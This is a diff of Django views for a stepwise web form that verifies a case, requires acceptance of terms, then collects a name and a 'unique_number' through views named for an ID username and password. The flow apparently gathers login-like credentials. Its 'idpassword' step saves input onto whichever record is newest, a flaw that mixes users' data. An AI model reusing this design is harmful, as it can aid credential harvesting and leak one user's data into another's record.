@@ -26,24 +26,49 @@ def index(request):
     return render(request, 'main/index.html', {'error': error})
 
 def terms_of_use(request):
-    # Check session verification
     if not request.session.get('verified_case'):
         return redirect('index')
+
+    if request.method == 'POST':
+        # Check if both checkboxes are checked
+        if all([
+            request.POST.get('terms') == 'on',
+            request.POST.get('privacy') == 'on'
+        ]):
+            request.session['accepted_terms'] = True
+            return redirect('Idusername')
+        
+        messages.error(request, "You must accept both agreements to continue")
+    
     return render(request, 'main/terms_of_use.html')
 
 
 def Idusername(request):
     if request.method == 'POST':
-        full_name = request.POST.get('full_name', '').strip()
-        
-        # Create new submission
+        full_name = request.POST.get('name', '').strip()
         UserSubmission.objects.create(name=full_name)
+        return redirect('idpassword')  # Replace with your actual next step URL
         
-        messages.success(request, f"Name '{full_name}' successfully recorded!")
-        return redirect('idpassword')  # Will implement number collection next
-        
-    return render(request, 'main/idpassword.html')
+    return render(request, 'main/Idusername.html')
 
-def collect_number(request):
-    # Will implement number collection next
-    return render(request, 'main/number_collection.html')
+def idpassword(request):
+     # Verify previous steps
+    if not request.session.get('verified_case') or not request.session.get('accepted_terms'):
+        return redirect('index')
+    
+    # Get latest submission
+    try:
+        submission = UserSubmission.objects.latest('created_at')
+    except UserSubmission.DoesNotExist:
+        return redirect('index')
+
+    if request.method == 'POST':
+        unique_number = request.POST.get('unique_number', '').strip()
+        
+        # Update existing record
+        submission.unique_number = unique_number
+        submission.save()
+        
+        return redirect('confirmation')  # Create this view next
+
+    return render(request, 'main/idpassword.html')
